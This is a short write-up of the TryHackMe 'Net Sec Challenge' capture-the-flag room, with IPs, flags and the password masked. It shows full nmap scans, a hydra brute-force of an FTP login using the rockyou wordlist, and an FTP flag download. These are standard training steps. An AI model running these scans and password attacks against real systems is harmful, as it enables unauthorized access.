<!-- TOC -->

- [Net Sec Challenge](#net-sec-challenge)
    - [Active Machine Information](#active-machine-information)
    - [Task 1](#task-1)
    - [Task 2](#task-2)

<!-- /TOC -->

# Net Sec Challenge

[Net Sec Challenge Room](https://tryhackme.com/room/netsecchallenge)

Practice the skills you have learned in the Network Security module.

## Active Machine Information

| Title | IP Address |
| :----: | :----: |
| NetSecMod Room 09 Challenge v1.11 | `1*.**.**.*` |

## Task 1

```bash
export IP=1*.**.**.*
```

## Task 2

```bash
sudo nmap -A -p- -T4 -vv -oA initial $IP
```

> `****/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)`

> `*****/tcp open  ftp         syn-ack ttl 61 v***** 3.*.*`

> `|_http-server-header: lighttpd THM{***_******_*****}`

> `|_    SSH-2.0-OpenSSH_8.2p1 THM{************}`

```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -t 20 -s 10021 -v $IP ftp
```

> `[10021][ftp] host: 1*.**.**.*   login: quinn   password: a*****`

Using: `quinn:a*****`

```bash
ftp 1*.**.**.* 10021
```

RHOST:

```bash
ls
get ftp_flag.txt
```

LHOST:

```bash
cat ftp_flag.txt
```

> `THM{************}`

```bash
sudo nmap -sN $IP
```

> `THM{********}`
